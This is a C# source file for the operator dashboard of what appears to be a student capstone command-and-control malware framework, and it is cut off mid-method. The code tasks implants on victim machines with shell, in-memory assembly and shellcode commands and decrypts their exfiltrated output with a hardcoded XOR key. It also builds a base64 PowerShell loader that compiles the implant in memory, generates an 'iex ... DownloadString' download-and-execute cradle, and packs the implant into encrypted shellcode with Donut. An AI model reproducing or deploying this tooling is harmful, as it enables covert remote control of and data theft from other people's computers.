using System;
using System.Collections.Generic;
using System.IO;
using System.Drawing;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.CSharp.Syntax;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using Newtonsoft.Json;
using System.Net.Http;
using MySqlX.XDevAPI;
using Windows.Media.Protection.PlayReady;


using System.Linq;

namespace CapstoneInterface
{
    public partial class Dashboard : Form
    {
        private System.Threading.Timer _messageFetchTimer;
        private System.Threading.Timer _configFetchTimer;
        private System.Threading.Timer _fetchAlerts;
        private System.Threading.Timer _fetchJSONOutput;
        private static HttpClient _httpClient = new HttpClient();

        public string host { get; set; }
        public string port { get; set; }

        public string operatorName { get; set; }
        public static string userToControl { get; set; }

        public string templatePayload = File.ReadAllText("C:\\Users\\vquer\\Desktop\\Malware\\Capstone\\Implementation\\NewImplant\\Implant.cs");
        public string menu = File.ReadAllText("C:\\Users\\vquer\\Desktop\\Malware\\Capstone\\Implementation\\CapstoneInterface\\menu.txt");
        public DataGridView Dgv { get; set; }
        public class Command
        {
            public string Input { get; set; }
            public string command { get; set; }
            public string Args { get; set; }
            public string ImplantUser { get; set; }
            public string Operator { get; set; }
            public string delay { get; set; }
            public string timeToExec { get; set; }
            public string File { get; set; }
            public string UseSmb { get; set; }
        }
        public class User
        {
            [JsonProperty("Victim.username")]
            public string Username { get; set; }

            [JsonProperty("Network.ip_address")]
            public string Network { get; set; }

            [JsonProperty("Operating_System.name")]
            public string OperatingSystem { get; set; }

            [JsonProperty("CPU.architecture")]
            public string CPU { get; set; }

            [JsonProperty("GPU.information")]
            public string GPU { get; set; }

            [JsonProperty("RAM.amount")]
            public string RAM { get; set; }

            [JsonProperty("Storage.amount")]
            public string Storage { get; set; }
        }


        /*GENESIS POR AQUI CAGANDOLA*/
        public class Listener
        {
            [JsonProperty("Name")]
            public string Name { get; set; }
            
            // [JsonProperty("Payload")]
            /*public string Payload { get; set; }*/
            
            [JsonProperty("IP")]
            public string IP { get; set; }

            //[JsonProperty("HostRotation")]
            /*public string HostRotation { get; set; }*/

            [JsonProperty("Port")]
            public string Port { get; set; }

            //[JsonProperty("UserAgent")]
            /*public string UserAgent { get; set; }*/
            
            [JsonProperty("Header")]
            public string Header { get; set; }
        }
        /*GENESIS POR AQUI CAGANDOLA*/

        public class Alert
        {
            public string AlertMessage { get; set; }
        }

        public Dashboard()
        {
            InitializeComponent();
            _messageFetchTimer = new System.Threading.Timer(async _ => await FetchMessagesAsync(), null, TimeSpan.Zero, TimeSpan.FromSeconds(2));
            _configFetchTimer = new System.Threading.Timer(async _ => await displayImplantConfig(), null, TimeSpan.Zero, TimeSpan.FromSeconds(7));
            _fetchAlerts = new System.Threading.Timer(async _ => await FetchAlertsAsync(), null, TimeSpan.Zero, TimeSpan.FromSeconds(3));
            _fetchJSONOutput = new System.Threading.Timer(async _ => await fetchJSONOutput(), null, TimeSpan.Zero, TimeSpan.FromSeconds(5));
        }

        private async void Dashboard_Load(object sender, EventArgs e)
        {
            txtConsoleOutput.Text = menu;
            lblServer.Text = host + ":" + port;
            txtPayloadGen.ScrollBars = ScrollBars.Vertical;

            // Parse the code into a SyntaxTree
            SyntaxTree tree = CSharpSyntaxTree.ParseText(templatePayload);

            // Get the root of the tree
            CompilationUnitSyntax root = tree.GetCompilationUnitRoot();

            // Normalize and format the whitespace in the code
            SyntaxNode formattedNode = root.NormalizeWhitespace();

            // The formatted code as a string
            string formattedCode = formattedNode.ToFullString();

            richTextBox1.Text = formattedCode;

            lblOperator.Text = operatorName;

            await displayImplantConfig();

            await FetchMessagesAsync();


        }
        public async Task<string> FetchAlertsAsync()
        {
            try
            {
                string responseBody = await _httpClient.GetStringAsync($"http://{host}:{port}/getAlerts");
                Console.WriteLine("Response: " + responseBody); // Debug statement

                // Split the response into separate JSON objects
                var alertStrings = responseBody.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
                var alertsText = new StringBuilder();

                foreach (var alertString in alertStrings)
                {
                    // Safely try to deserialize each JSON object
                    try
                    {
                        var alert = JsonConvert.DeserializeObject<Alert>(alertString);
                        if (alert != null)
                        {
                            alertsText.AppendLine(alert.AlertMessage); // Assuming 'Alert' is the correct property name
                        }
                    }
                    catch (JsonException ex)
                    {
                        Console.WriteLine("JSON Parse Error: " + ex.Message);
                    }
                }

                string result = alertsText.ToString();
                //rTxtMessagesBox.Text = result; // Ensure this runs on UI thread
                return result;
            }
            catch (Exception ex)
            {
                //rTxtMessagesBox.Text = "Error: " + ex.Message; // Debug statement
                return "Error: " + ex.Message;
            }
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            // set the current caret position to the end
            txtConsoleOutput.SelectionStart = txtConsoleOutput.Text.Length;
            // scroll it automatically
            txtConsoleOutput.ScrollToCaret();
        }

        private void btnConsole_Click(object sender, EventArgs e)
        {

        }

        private void btnProcesses_Click(object sender, EventArgs e)
        {
            // Create an instance of the OpenFileDialog class
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.InitialDirectory = "c:\\"; // You can set the initial directory
            openFileDialog.Filter = "All files (*.*)|*.*"; // You can filter to specific file types
            openFileDialog.FilterIndex = 2;
            openFileDialog.RestoreDirectory = true;

            string filePath = string.Empty;

            // Show the dialog and get result.
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                // Get the selected file's full path
                filePath = openFileDialog.FileName;
                lblFileToUploadPath.Text = filePath;
            }
        }

        private void txtImplantCode_TextChanged(object sender, EventArgs e)
        {
        }


        private void btnRunCommand_Click(object sender, EventArgs e)
        {
            string dateTimeFormatted = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss");

            foreach (DataGridViewRow row in dataGridView1.Rows)
            {
                bool isChecked = Convert.ToBoolean(row.Cells["Check"].Value);

                if (isChecked)
                {
                    userToControl = row.Cells["Username"].Value.ToString();
                }
            }

            String input = txtCommand.Text;

            Command commandForImplant = new Command();

            if (input != "")
            {
                if (input.Contains("os"))
                {
                    string[] result = input.Split(' ');

                    // Assign the first part to a variable 'instruction'
                    string instruction = result[0];

                    // Join the remaining parts (if any) into a single string for 'args'
                    string command = result.Length > 1 ? string.Join(" ", result.Skip(1)) : "";

                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + command + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = instruction;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Args = "";
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.command = command;

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }
                else if (input.Contains("powerless"))
                {
                    string[] result = input.Split(' ');

                    // Assign the first part to a variable 'instruction'
                    string instruction = result[0];

                    // Join the remaining parts (if any) into a single string for 'args'
                    string command = result.Length > 1 ? string.Join(" ", result.Skip(1)) : "";

                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + command + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = instruction;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Args = "";
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.command = command;

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }
                else if (input.Contains("execute-assembly"))
                {
                    string[] result = input.Split(' ');

                    string instruction = result[0];
                    string assBase64 = result[1];

                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = instruction;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.File = assBase64;

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }

                else if (input.Contains("enable_smb_client"))
                {
                    string[] result = input.Split(' ');

                    string instruction = result[0];
                    string computername = result[1];

                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = instruction;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Args = computername;
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.File = "";

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }

                else if (input.Contains("load_shellcode"))
                {
                    string[] result = input.Split(' ');

                    string instruction = result[0];
                    string url = result[1];
                    instruction = instruction.TrimEnd();
                    url = url.TrimStart();

                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = instruction;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.File = url;

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }

                else if (input.Contains("loadcs"))
                {
                    string[] result = input.Split(' ');

                    string instruction = result[0];
                    string cs = result[1];

                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction.ToString() + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = input;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.File = cs;

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }

                else if (input.Contains("upload"))
                {
                    string filename = Path.GetFileName(lblFileToUploadPath.Text);
                    //string dir = Path.GetDirectoryName(lblFileToUploadPath.Text);

                    commandForImplant.Input = "upload"; // Keep as is
                    commandForImplant.command = "."; // Renamed from 'command' to 'Command'
                    commandForImplant.Args = filename; // New property, set as needed
                    commandForImplant.ImplantUser = userToControl; // Keep as is
                    commandForImplant.Operator = operatorName; // Keep as is
                    commandForImplant.timeToExec = "0"; // Renamed from 'timeToExec' to 'TimeToExec'
                    commandForImplant.delay = "0"; // Renamed from 'delay' to 'Delay'

                    byte[] fileBytes = File.ReadAllBytes(lblFileToUploadPath.Text);
                    string base64File = Convert.ToBase64String(fileBytes);
                    commandForImplant.File = base64File;

                    commandForImplant.UseSmb = "false"; // New property, set as needed or default

                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + commandForImplant.Input + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }

                else if (input.Contains("cd"))
                {
                    string[] result = input.Split(' ');

                    string instruction = result[0];
                    string path = result[1];

                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = instruction;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Args = path;
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.File = "";

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }

                else
                {
                    string instruction = input;

                    string userCommand = dateTimeFormatted + " " + operatorName + " sent " + instruction + " to '" + userToControl + "'";

                    txtConsoleOutput.AppendText("\r\n\r\n");
                    // Append the user command to the console output
                    txtConsoleOutput.AppendText(userCommand + "\r\n");

                    commandForImplant.Input = input;
                    commandForImplant.ImplantUser = userToControl;
                    commandForImplant.Operator = operatorName;
                    commandForImplant.timeToExec = "0";
                    commandForImplant.delay = "0";
                    commandForImplant.File = "";

                    dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                }
            }
        }

        public async void sendJSONInstruction(dynamic jsonCommand, dynamic user)
        {
            HttpClient client = new HttpClient();
            var content = new StringContent(jsonCommand, Encoding.UTF8, "application/json");
            await client.PostAsync("http://" + host + ":8082/postCommand", content);
        }

        public async Task fetchJSONOutput()
        {
            // Wait for 10 seconds
            await Task.Delay(10000);

            HttpClient client = new HttpClient();
            // Fetch output from the /fetchOutput endpoint
            HttpResponseMessage outputResponse = await client.GetAsync("http://" + host + ":" + port + "/getOutput");

            if (outputResponse.IsSuccessStatusCode)
            {
                // Fetch output as base64 string
                string outputBase64 = await outputResponse.Content.ReadAsStringAsync();

                if (string.IsNullOrEmpty(outputBase64))
                {
                    return;
                }

                // Base64 decode the string to get byte array
                byte[] outputBytes = Convert.FromBase64String(outputBase64);

                // Decode XORKey
                string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
                byte[] XORKey = Convert.FromBase64String(XORKeyB64);

                // Decrypt the XOR-encoded output bytes
                byte[] decryptedOutputBytes = XOR(outputBytes, XORKey);

                // Convert the decrypted output bytes back to string
                string decryptedOutput = Encoding.UTF8.GetString(decryptedOutputBytes);

                // Parse JSON
                dynamic outputObj = JsonConvert.DeserializeObject(decryptedOutput);

                // Base64 decode the Output field
                string outputContentBase64 = outputObj.Output;
                byte[] outputContentBytes = Convert.FromBase64String(outputContentBase64);
                string outputContent = Encoding.UTF8.GetString(outputContentBytes);

                txtConsoleOutput.AppendText("\r\n\r\n" + "Receiving " + outputContent.Length + " bytes from " + outputObj.ImplantUser);
                await Task.Delay(2000);
                txtConsoleOutput.AppendText("\r\n\r\n" + outputContent);
            }


            else
            {
                txtConsoleOutput.AppendText($"\r\nFailed to fetch output. Status code: {outputResponse.StatusCode}");
                string errorContent = await outputResponse.Content.ReadAsStringAsync();
                txtConsoleOutput.AppendText($"\r\nError content: {errorContent}");
            }
        }

        public static byte[] XOR(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }



        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            dataGridView1.DataSource = null;
            dataGridView1.Columns.Clear();

            HttpClient client = new HttpClient();
            HttpResponseMessage response = await client.GetAsync("http://" + host + ":" + port + "/getClients");

            List<User> devices = null;

            if (response.IsSuccessStatusCode)
            {
                string json = await response.Content.ReadAsStringAsync();
                dynamic jsonObj = JsonConvert.DeserializeObject(json);

                devices = JsonConvert.DeserializeObject<List<User>>(json);
            }
            else
            {
                Console.WriteLine("Error: " + response.StatusCode);
            }

            // Create a new DataGridViewCheckBoxColumn
            DataGridViewCheckBoxColumn checkColumn = new DataGridViewCheckBoxColumn();
            checkColumn.HeaderText = "Check";
            checkColumn.Width = 30;
            checkColumn.Name = "Check";
            checkColumn.FlatStyle = FlatStyle.Standard;
            checkColumn.CellTemplate = new DataGridViewCheckBoxCell(false);

            // Add the check column to the DataGridView
            dataGridView1.Columns.Insert(0, checkColumn);

            dataGridView1.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            // Now you can bind the list to the Data Grid View
            dataGridView1.DataSource = devices;
        }

        private async void btnGetData_ClickAsync(object sender, EventArgs e)
        {
            HttpClient client = new HttpClient();
            HttpResponseMessage response = await client.GetAsync($"http://{host}:{port}/getClients");

            List<User> devices = null;

            if (response.IsSuccessStatusCode)
            {
                string json = await response.Content.ReadAsStringAsync();
                dynamic jsonObj = JsonConvert.DeserializeObject(json);

                devices = JsonConvert.DeserializeObject<List<User>>(json);
            }
            else
            {
                Console.WriteLine("Error: " + response.StatusCode);
            }

            dataGridView2.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            // Now you can bind the list to the Data Grid View
            dataGridView2.DataSource = devices;
        }

        private void btnPayloadGenerate_Click(object sender, EventArgs e)
        {
            string code = templatePayload;

            SyntaxTree tree = CSharpSyntaxTree.ParseText(code);
            CompilationUnitSyntax root = tree.GetCompilationUnitRoot();
            SyntaxNode formattedNode = root.NormalizeWhitespace();
            string formattedCode = formattedNode.ToFullString();

            txtPayloadGen.Text = formattedCode;
        }

        private async void btnBundlePayload_Click(object sender, EventArgs e)
        {
            txtPayloadGen.Text = "";
            var plainTextBytes = Encoding.UTF8.GetBytes(templatePayload);
            var b64encodedPayload = Convert.ToBase64String(plainTextBytes);
            var powerShellNETLoader = @"function Invoke-Run() {
    $encodedSource = '" + b64encodedPayload + @"'
    $bytes = [Convert]::FromBase64String($encodedSource)
    $source = [System.Text.Encoding]::UTF8.GetString($bytes)
    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
    $compiler = $provider.CreateCompiler()
    $parameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $parameters.GenerateInMemory = $True

    $parameters.ReferencedAssemblies.Add(""System.dll"") | Out-Null
    $parameters.ReferencedAssemblies.Add(""System.Net.dll"") | Out-Null
    $parameters.ReferencedAssemblies.Add(""System.Net.Http.dll"") | Out-Null
    
    Write-Host $source
    $results = $compiler.CompileAssemblyFromSource($parameters, $source)
    if ($results.Errors.Count -eq 0) {
        $assembly = $results.CompiledAssembly
        $method = $assembly.EntryPoint
        $method.Invoke($null, $null)
    } else {
        $results.Errors | % { Write-Host $_.ErrorText }
    }
}

Invoke-Run
";


            // Base64 encode powerShellNETLoader
            var netLoaderBytes = System.Text.Encoding.UTF8.GetBytes(powerShellNETLoader);
            var b64encodedNetLoader = System.Convert.ToBase64String(netLoaderBytes);

            var payload = new
            {
                Code = b64encodedNetLoader
            };

            var jsonPayload = JsonConvert.SerializeObject(payload);
            var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

            HttpClient client = new HttpClient();
            var response = await client.PostAsync($"http://{host}:{port}/agents/windows/powershell", content);

            if (response.IsSuccessStatusCode)
            {
                txtPayloadGen.Text += powerShellNETLoader;
            }
            else
            {
                // Handle unsuccessful post
            }

            MessageBox.Show("Payload Bundled and Uploaded to Server for Hosting!");

            Cradle cradle = new Cradle();
            cradle.payload = $"iex (New-Object Net.WebClient).DownloadString(\'http://{host}:{port}/agents/windows/powershell\')";
            cradle.ShowDialog();
        }


        public class Messages
        {
            public string Username { get; set; }
            public string Message { get; set; } // Avoid property name 'Message' as it might collide with 'System.Exception.Message'
        }

        private Messages _lastFetchedMessage;

        private void btnEditImplant_Click(object sender, EventArgs e)
        {
            if (richTextBox1.Text != templatePayload.ToString())
            {
                templatePayload = richTextBox1.Text;
            }
        }

        private void btnSignOut_Click(object sender, EventArgs e)
        {
            operatorName = "";

            formLogin form = new formLogin();
            this.Hide();
            form.Closed += (s, args) => this.Close();
            form.Show();
        } 

        private async void btnSendMessage_Click(object sender, EventArgs e)
        {
            Messages message = new Messages
            {
                Username = operatorName, // Replace with the actual username
                Message = txtMessageInput.Text    // Replace with the actual message
            };

            string jsonString = JsonConvert.SerializeObject(message);

            using (HttpClient httpClient = new HttpClient())
            {
                var content = new StringContent(jsonString, Encoding.UTF8, "application/json");
                try
                {
                    HttpResponseMessage response = await httpClient.PostAsync($"http://{host}:{port}/messagePost", content);
                }
                catch (Exception ex)
                {
                    // Save the original selection start and length
                    int originalStart = rTxtMessagesBox.SelectionStart;
                    int originalLength = rTxtMessagesBox.SelectionLength;

                    // Append username and set its color to white
                    rTxtMessagesBox.AppendText($"Error: ");
                    rTxtMessagesBox.Select(originalStart, message.Username.Length + 4);  // 4 for " -> "
                    rTxtMessagesBox.SelectionColor = Color.White;

                    // Append the message and reset its color to the default one
                    rTxtMessagesBox.AppendText($"{ex}");
                    rTxtMessagesBox.Select(rTxtMessagesBox.TextLength, 0);
                    rTxtMessagesBox.SelectionColor = Color.Red;

                    // Restore the original selection start and length
                    rTxtMessagesBox.Select(originalStart, originalLength);
                }
            }
        }

        private async Task FetchMessagesAsync()
        {
            try
            {
                var response = await _httpClient.GetAsync($"http://{host}:{port}/messageGet");
                if (response.IsSuccessStatusCode)
                {
                    var jsonString = await response.Content.ReadAsStringAsync();
                    var message = JsonConvert.DeserializeObject<Messages>(jsonString);

                    // Check if this message is the same as the last fetched message
                    if (_lastFetchedMessage == null ||
                        message.Username != _lastFetchedMessage.Username ||
                        message.Message != _lastFetchedMessage.Message)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            // Variables holding colored text
                            string usernamePart = $"{message.Username} -> ";
                            string messagePart = $"{message.Message}{Environment.NewLine}";

                            // Append the username and set its color to White
                            int startUsername = rTxtMessagesBox.TextLength;
                            rTxtMessagesBox.AppendText(usernamePart);
                            int endUsername = rTxtMessagesBox.TextLength;
                            rTxtMessagesBox.Select(startUsername, endUsername - startUsername);
                            rTxtMessagesBox.SelectionColor = Color.White;

                            // Append the message and set its color to Lime
                            int startMessage = rTxtMessagesBox.TextLength;
                            rTxtMessagesBox.AppendText(messagePart);
                            int endMessage = rTxtMessagesBox.TextLength;
                            rTxtMessagesBox.Select(startMessage, endMessage - startMessage);
                            rTxtMessagesBox.SelectionColor = Color.Lime;

                            // Reset the selection color to default
                            rTxtMessagesBox.SelectionStart = rTxtMessagesBox.TextLength;
                            rTxtMessagesBox.SelectionColor = rTxtMessagesBox.ForeColor;
                        });

                        // Update the last fetched message
                        _lastFetchedMessage = message;
                    }
                }
            }
            catch (Exception ex)
            {
                // Handle any errors that occurred making the request
                Console.WriteLine(ex.Message);
            }
        }

        public class ListenersRoot
        {
            public List<Listener> Listeners { get; set; }
        }

        private async Task displayImplantConfig()
        {
            if (InvokeRequired)
            {
                // Invoke the method on the UI thread
                Invoke(new MethodInvoker(async () => await displayImplantConfig()));
                return;
            }

            // Clear the DataGridView
            dgvImplantConfig.DataSource = null;
            dgvImplantConfig.Columns.Clear();

            // Validate host and port
            if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(port))
            {
                MessageBox.Show("Host or port is null or empty. Please check the configuration.");
                return;
            }

            // Construct the URI
            var getListenersUri = new Uri($"http://{host}:{port}/getListeners");

            // Continue with the rest of the method if the URI is correct
            try
            {
                var response = await _httpClient.GetAsync(getListenersUri);

                if (response.IsSuccessStatusCode)
                {
                    var json = await response.Content.ReadAsStringAsync();
                    var root = JsonConvert.DeserializeObject<ListenersRoot>(json);

                    // Check if the DataGridView already has a "Check" column to prevent adding it multiple times
                    if (!dgvImplantConfig.Columns.Contains("Check"))
                    {
                        AddCheckBoxColumn();
                    }

                    dgvImplantConfig.DataSource = root.Listeners;
                }
                else
                {
                    //MessageBox.Show($"Error: {response.StatusCode}");
                }
            }
            catch (Exception)
            {
                //MessageBox.Show($"An error occurred: {ex.Message}");
            }

            // Adjust the DataGridView's properties
            dgvImplantConfig.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
        }

        private void AddCheckBoxColumn()
        {
            var checkColumn = new DataGridViewCheckBoxColumn
            {
                HeaderText = "Check",
                Width = 30,
                Name = "Check",
                FlatStyle = FlatStyle.Standard,
                CellTemplate = new DataGridViewCheckBoxCell(false)
            };

            dgvImplantConfig.Columns.Insert(0, checkColumn);
        }

        private void CompileAndConvertToShellcode(string basedirWin, string ip, string port)
        {
            string implantFilePath = Path.Combine(basedirWin, "NewImplant\\Implant.cs");

            try
            {
                // Handle Implant.cs
                string originalImplantContents = ReadFileContents(implantFilePath, "Read original Implant.cs");
                string modifiedImplantContents = originalImplantContents
                    .Replace("public static string host = \"<IP>\";", $"public static string host = \"{ip}\";")
                    .Replace("public static string port = \"<PORT>\";", $"public static string port = \"{port}\";");

                WriteFileContents(implantFilePath, modifiedImplantContents, "Write modified Implant.cs");

                // Compilation and conversion process for both Implant and Loader
                ExecuteCompilationAndConversion(basedirWin, "Compilation and conversion for Implant");

                // Revert the changes to maintain original state
                WriteFileContents(implantFilePath, originalImplantContents, "Revert Implant.cs changes");
            }
            catch (Exception)
            {
                //MessageBox.Show($"An error occurred: {ex.Message}");
            }
        }

        private string ReadFileContents(string filePath, string operation)
        {
            try
            {
                return File.ReadAllText(filePath);
            }
            catch (Exception ex)
            {
                throw new Exception($"{operation} failed: {ex.Message}");
            }
        }

        private void WriteFileContents(string filePath, string contents, string operation)
        {
            try
            {
                File.WriteAllText(filePath, contents);
            }
            catch (Exception ex)
            {
                throw new Exception($"{operation} failed: {ex.Message}");
            }
        }

        private void ExecuteCompilationAndConversion(string basedirWin, string operation)
        {
            try
            {
                string cscPath = @"dotnet";
                string csProjImplant = @"C:\Users\vquer\Desktop\Malware\Capstone\Implementation\NewImplant\NewImplant.csproj";
                string donutPath = Path.Combine(basedirWin, "donut\\donut.exe");
                string implantExePath = Path.Combine(basedirWin, "donut\\");
                string outputShellcodePath = Path.Combine(basedirWin, "Encryption\\implant.bin");

                // Compile the C# code
                string compileCommand = $"build {csProjImplant} -c Release -o \"{implantExePath}\"";

                // Convert the compiled executable to shellcode using Donut
                string convertCommand = $"-a 2 --input:\"{implantExePath}NewImplant.exe\" --output:\"{outputShellcodePath}\"";
                txtPayloadGen.AppendText($"{compileCommand}\n\n" + Environment.NewLine);
                txtPayloadGen.AppendText($"{convertCommand}\n\n" + Environment.NewLine);

                ExecuteCommand(cscPath, compileCommand);
                ExecuteCommand(donutPath, convertCommand);
            }
            catch (Exception ex)
            {
                throw new Exception($"{operation} failed: {ex.Message}");
            }
        }

        private void ExecuteCommand(string fileName, string arguments)
        {
            using (var process = new Process())
            {
                process.StartInfo.FileName = fileName;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                Console.WriteLine($"Executing {fileName} {arguments}\n\n\n");
                try
                {
                    process.Start();
                    process.WaitForExit();

                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    // Append both standard output and error to the text box
                    txtPayloadGen.AppendText($"Command Output: {output}\n" + Environment.NewLine);
                    if (!string.IsNullOrEmpty(error))
                    { 
                        txtPayloadGen.AppendText($"An error occurred: {error}\n" + Environment.NewLine);
                    }

                    // Append command details for reference
                    txtPayloadGen.AppendText($"Executed Filename: {fileName}\n" + Environment.NewLine);
                }
                catch (Exception ex)
                {
                    txtPayloadGen.AppendText($"An exception occurred while executing the command: {ex.Message}\n" + Environment.NewLine);
                }
            }
        }

        private void ExecuteCommandCryptoCutter(string fileName, string arguments)
        {
            using (var process = new Process())
            {
                process.StartInfo.FileName = fileName;
                process.StartInfo.Arguments = arguments;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;

                try
                {
                    process.Start();
                    process.WaitForExit();

                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    // Append both standard output and error to the text box
                    txtPayloadGen.AppendText($"Command Output: {output}\n" + Environment.NewLine);
                    if (!string.IsNullOrEmpty(error))
                    {
                        /*txtPayloadGen.AppendText($"An error occurred: {error}\n" + Environment.NewLine);*/
                    }

                    // Append command details for reference
                    /*txtPayloadGen.AppendText($"Executed Filename: {fileName}\n" + Environment.NewLine);*/
                }
                catch (Exception)
                {
                    /*txtPayloadGen.AppendText($"An exception occurred while executing the command: {ex.Message}\n" + Environment.NewLine);*/
                }
            }
        }

        private void EncryptShellcode(string basedirWin)
        {
            string pythonScriptPath = "Cryptocutter.py";
            string inputFilePath = Path.Combine(basedirWin, "Encryption\\implant.bin");
            string outputFilePath = Path.Combine(basedirWin, "Server\\OutputShellcode\\implant.bin");

            string arguments = $"\"{pythonScriptPath}\" -f \"{inputFilePath}\" -o \"{outputFilePath}\"";
            //txtPayloadGen.AppendText($"{arguments}" + Environment.NewLine);

            ExecuteCommandCryptoCutter("python", arguments);

        }

        private void CompileLoader()
        {
            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
            {
                string cscPath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
                string loaderExePath = @"C:\Users\vquer\Desktop\Malware\Capstone\Implementation\Loader\Loader.exe";
                string loaderCsPath = @"C:\Users\vquer\Desktop\Malware\Capstone\Implementation\Loader\Loader.cs";

                string arguments = $"/out:\"{loaderExePath}\" \"{loaderCsPath}\"";
                /*txtPayloadGen.AppendText($"{arguments}" + Environment.NewLine);*/

                ExecuteCommand(cscPath, arguments);
                SaveCompiledLoader();
            }
            else
            {
